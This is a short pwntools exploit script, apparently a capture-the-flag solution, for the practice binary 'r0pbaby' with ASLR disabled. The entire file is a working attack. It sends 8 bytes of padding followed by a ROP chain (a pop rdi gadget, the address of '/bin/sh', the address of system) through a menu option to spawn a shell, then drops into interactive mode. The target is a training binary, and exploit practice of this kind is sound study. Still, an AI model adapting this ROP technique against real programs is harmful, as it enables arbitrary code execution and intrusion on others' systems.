#-*-coding:utf-8-*-
#filename = exp_off_aslr.py
#author = reshahar
from pwn import *

s = process('./r0pbaby')

def senddata(data):
    s.recvuntil(': ')
    s.sendline('3')
    s.recvuntil('): ')
    s.sendline(str(len(data)))
    s.sendline(data)

#system(rdi="/bin/sh")

#raw_input()

prdi = 0x0000555555554f23  #0x0000000000000f23 : pop rdi ; ret
binsh = 0x7ffff7990160      #/bin/sh
system = 0x7ffff78704f0     #system 

playload = 'A'*8+p64(prdi)+p64(binsh)+p64(system)

print '###send playload###'

senddata(playload)

s.recvuntil(': Bad choice.')

s.interactive()

